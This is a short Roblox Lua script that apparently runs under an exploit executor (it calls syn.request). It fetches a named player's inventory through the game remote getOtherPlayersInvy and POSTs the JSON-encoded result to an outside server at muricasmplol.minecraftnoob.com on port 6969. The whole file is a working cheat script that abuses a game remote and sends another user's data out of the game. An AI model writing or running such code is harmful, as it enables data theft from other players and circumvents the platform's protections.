local Players = game:GetService("Players")
local player = Players["Anto_Crasher666"]
print(player)

local playerinv = game.ReplicatedStorage.remotes.getOtherPlayersInvy:InvokeServer(player)
print(playerinv)
if playerinv then
---@diagnostic disable-next-line: undefined-global
    local content = syn.request(
    {
        Url = "http://muricasmplol.minecraftnoob.com:6969/",  
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({inv = playerinv})
    }
)
end